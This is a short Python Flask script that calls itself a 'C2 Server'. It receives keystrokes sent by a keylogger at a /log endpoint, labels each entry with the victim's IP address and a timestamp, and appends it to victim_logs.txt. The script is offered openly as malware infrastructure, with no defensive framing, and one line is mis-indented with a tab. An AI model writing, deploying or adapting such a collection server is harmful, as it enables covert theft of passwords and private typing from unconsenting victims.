from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

#verify the server is running
@app.route('/')
def home():
    return "<h1>Server Status: Online</h1>"
@app.route('/log', methods=['POST'])
def receive_data():
    data = request.json.get('keystrokes')
    client_ip = request.remote_addr  #Victim's IP address
    
    if data:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_entry = f"\n[IP: {client_ip} | TIME: {timestamp}]\n{data}\n"
        log_entry += "-"*50 + "\n"
	with open("victim_logs.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        print(f"[+] Data received from {client_ip}") 
        return "OK", 200
    
    return "No Data Received", 400

if __name__ == "__main__":
    
    print("[*] C2 Server is listening on port 5000...")
    app.run(host='0.0.0.0', port=5000)
